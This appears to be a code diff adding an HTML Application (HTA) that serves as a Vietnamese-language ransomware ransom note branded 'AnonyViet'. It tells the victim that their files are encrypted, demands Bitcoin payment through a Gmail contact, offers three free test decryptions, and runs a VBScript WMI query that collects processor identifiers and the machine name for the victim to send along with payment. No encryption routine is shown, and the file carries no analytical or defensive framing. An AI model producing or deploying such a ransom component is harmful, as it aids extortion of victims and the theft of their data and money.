@@ -1,0 +1,108 @@
+﻿<html>
+<SCRIPT LANGUAGE="VBScript">
+    Sub UngDung
+	On Error Resume Next
+       Set colItems = GetObject("winmgmts:\root\CIMV2").ExecQuery("SELECT * FROM Win32_Processor")
+   For Each objItem In colItems
+      a = a & vbCr & "AddressWidth: " & objItem.AddressWidth
+      a = a & vbCr & "Architecture: " & objItem.Architecture
+      a = a & vbCr & "Availability: " & objItem.Availability
+      a = a & vbCr & "Caption: " & objItem.Caption
+      a = a & vbCr & "ConfigManagerErrorCode: " & objItem.ConfigManagerErrorCode
+      a = a & vbCr & "ConfigManagerUserConfig: " & objItem.ConfigManagerUserConfig
+      a = a & vbCr & "CpuStatus: " & objItem.CpuStatus
+      a = a & vbCr & "CreationClassName: " & objItem.CreationClassName
+      a = a & vbCr & "CurrentClockSpeed: " & objItem.CurrentClockSpeed
+      a = a & vbCr & "CurrentVoltage: " & objItem.CurrentVoltage
+      a = a & vbCr & "DataWidth: " & objItem.DataWidth
+      a = a & vbCr & "Description: " & objItem.Description
+      a = a & vbCr & "DeviceID: " & objItem.DeviceID
+      a = a & vbCr & "ErrorCleared: " & objItem.ErrorCleared
+      a = a & vbCr & "ErrorDescription: " & objItem.ErrorDescription
+      a = a & vbCr & "ExtClock: " & objItem.ExtClock
+      a = a & vbCr & "Family: " & objItem.Family
+      a = a & vbCr & "L2CacheSize: " & objItem.L2CacheSize
+      a = a & vbCr & "L2CacheSpeed: " & objItem.L2CacheSpeed
+      a = a & vbCr & "LastErrorCode: " & objItem.LastErrorCode
+      a = a & vbCr & "Level: " & objItem.Level
+      a = a & vbCr & "LoadPercentage: " & objItem.LoadPercentage
+      a = a & vbCr & "Manufacturer: " & objItem.Manufacturer
+      a = a & vbCr & "MaxClockSpeed: " & objItem.MaxClockSpeed
+      a = a & vbCr & "Name: " & objItem.Name
+      a = a & vbCr & "OtherFamilyDescription: " & objItem.OtherFamilyDescription
+      a = a & vbCr & "PNPDeviceID: " & objItem.PNPDeviceID
+      a = a & vbCr & "PowerManagementCapabilities: " & strPowerManagementCapabilities
+      a = a & vbCr & "PowerManagementSupported: " & objItem.PowerManagementSupported
+      a = a & vbCr & "ProcessorId: " & objItem.ProcessorId
+      a = a & vbCr & "ProcessorType: " & objItem.ProcessorType
+      a = a & vbCr & "Revision: " & objItem.Revision
+      a = a & vbCr & "Role: " & objItem.Role
+      a = a & vbCr & "SocketDesignation: " & objItem.SocketDesignation
+      a = a & vbCr & "Status: " & objItem.Status
+      a = a & vbCr & "StatusInfo: " & objItem.StatusInfo
+      a = a & vbCr & "Stepping: " & objItem.Stepping
+      a = a & vbCr & "SystemCreationClassName: " & objItem.SystemCreationClassName
+      a = a & vbCr & "SystemName: " & objItem.SystemName
+      a = a & vbCr & "UniqueId: " & objItem.UniqueId
+      a = a & vbCr & "UpgradeMethod: " & objItem.UpgradeMethod
+      a = a & vbCr & "Version: " & objItem.Version
+      a = a & vbCr & "VoltageCaps: " & objItem.VoltageCaps
+   Next
+	ScriptArea.Value= a
+    End Sub
+</SCRIPT>
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+	<title>AnonyViet</title>
+	<HTA:APPLICATION ID="MyHTAId" APPLICATIONNAME="MyHTA" BORDER="DIALOG" MAXIMIZEBUTTON="NO" SCROLLFLAT="YES" CAPTION="YES" SELECTION="NO" INNERBORDER="NO" ICON="" SCROLL="NO" SHOWINTASKBAR="YES" SINGLEINSTANCE="YES" SYSMENU="YES" WINDOWSTATE="NORMAL" />
+</head>
+
+<script language=javascript>
+	var winWidth=1024;
+	var winHeight = 920;
+	window.resizeTo(winWidth, winHeight);
+	var winPosX=screen.width/2-winWidth/2;
+	var winPosY=screen.height/2-winHeight/2;
+	window.moveTo(winPosX, winPosY);
+</script>
+
+<style type='text/css'>
+	body{font:14px Tahoma, sans-serif;margin: 13px;line-height: 20px;background: #EDEDED;}
+	.bold{font-weight: bold;}
+	.mark{background: #D0D0E8;padding: 2px 5px;}
+	.header{text-align: center;font-size: 25px;line-height: 40px;font-weight: bold;margin-bottom:20px;}
+	.info{background: #D0D0E8;border-left: 10px solid #00008B;}
+	.private{border: 1px dashed #000;background: #FFFFEF;}
+	.note{height: auto;padding-bottom: 1px;margin: 15px 0;}
+	.note .title{font-weight: bold;text-indent: 10px;height: 25px;line-height: 30px;padding-top: 10px;}
+	.note ul{margin-top: 0;}
+</style>
+
+<body>
+	<div class='header'>
+		<div>Tất cả dữ liệu của bạn đã bị mã hóa</div>
+	</div>
+	<div class='bold'>Các tài liệu, ảnh, cơ sở dữ liệu của bạn và các tập tin quan trọng khác đã được mã hóa, khôi phục lại dữ liệu là điều không thể. Các tài liệu, ảnh, cơ sở dữ liệu của bạn và các tệp quan trọng khác đã được mã hóa mật mã rất nhiều, không thể khôi phục mà không có chìa khóa gốc! Để giải mã các tập tin của bạn, bạn cần phải mua một chương trình đặc biệt - COR6 DECRYPTER. Việc sử dụng các công cụ khác có thể làm hỏng các file của bạn. Nếu bạn muốn khôi phục dữ liệu mã hóa, hãy gửi email cho chúng tôi <span class='mark'>theblackvaultufofootage@gmail.com</span>
+	</div>
+	<div>Bạn sẽ phải chi trả bằng Bitcoins cho việc giải mã dữ liệu. Giá cả phụ thuộc vào thời gian bạn gửi email cho chúng tôi. Sau khi thanh toán, chúng tôi sẽ gửi cho bạn công cụ giải mã sẽ giải mã tất cả các tệp của bạn.</div>
+	<div class='note info'>
+		<div class='title'>Giải mã miễn phí 3 files</div>
+		<ul>Trước khi thanh toán, bạn có thể gửi cho chúng tôi tối đa 3 tệp để giải mã miễn phí. Tổng kích thước tệp phải dưới 1MB (không nén) và tệp không được chứa thông tin có giá trị. (database,backup, excel ...)</ul>
+	</div>
+	<div class='note info'>
+		<div class='title'>Làm thế nào để có được bitcoin</div>
+		<ul>Cách dễ nhất để mua bitcoins là trang web LocalBitcoins. Bạn phải đăng ký, bấm vào 'Mua bitcoins', và chọn người bán theo phương thức thanh toán và giá cả.
+			<br><a href='https://localbitcoins.com/buy_bitcoins'>https://localbitcoins.com/buy_bitcoins</a>
+			<br>Ngoài ra bạn có thể tìm thấy những nơi khác để mua Bitcoins ở đây:
+			<br><a href='http://www.coindesk.com/information/how-can-i-buy-bitcoins/'>http://www.coindesk.com/information/how-can-i-buy-bitcoins/</a>
+		</ul>
+	</div>
+	<div class='note'>
+		<div class='title'>Copy đoạn mã dưới đây và gửi kèm theo Bitcoin</div>
+	</div>
+	</div>
+	<center>
+		<textarea name="ScriptArea" rows=12 cols=80></textarea><p>
+    <input id=runbutton  type="button" value="Lấy thông tin" onClick="UngDung">
+    </center>
+</body>
